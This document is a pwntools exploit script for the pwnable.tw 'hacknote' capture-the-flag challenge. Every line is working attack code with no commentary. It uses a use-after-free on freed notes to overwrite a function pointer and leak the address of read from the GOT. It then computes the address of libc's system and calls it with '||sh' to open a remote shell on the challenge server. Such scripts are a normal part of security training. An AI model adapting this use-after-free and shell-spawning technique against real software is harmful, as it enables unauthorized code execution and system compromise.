from pwn import *
 
p = remote("chall.pwnable.tw",10102)
#p=process("./hacknote")
elf = ELF("./hacknote")
libc = ELF("./libc_32.so.6")
read_got = elf.got["read"]
pfputs = 0x804862b
 
def add_note(size,index):
      p.recvuntil(b"choice :")
      p.sendline(b"1")
      p.recvuntil(b"size :")
      p.sendline(size)
      p.recvuntil(b"Content :")
      p.sendline(index)
 
def delete_note(index):
      p.recvuntil(b"choice :")
      p.sendline(b"2")
      p.recvuntil(b"Index :")
      p.sendline(index)
 
def print_note(index):
      p.recvuntil(b"choice :")
      p.sendline(b"3")
      p.recvuntil(b"Index :")
      p.sendline(index)

#p.interactive()
add_note(b"16",b"aaaaa")
add_note(b"16",b"aaaaa")
delete_note(b'0')
delete_note(b'1')
add_note(b'8',p32(pfputs)+p32(read_got))
print_note(b'0')

pfread = u32(p.recv()[0:4])
pfsys = pfread - 0xd41c0 + 0x3a940
#p.interactive()
delete_note(b'2')
#p.interactive()
#p.recv()
#p.interactive()
add_note(b'8',p32(pfsys)+b"||sh")
print_note(b'0')
p.interactive()
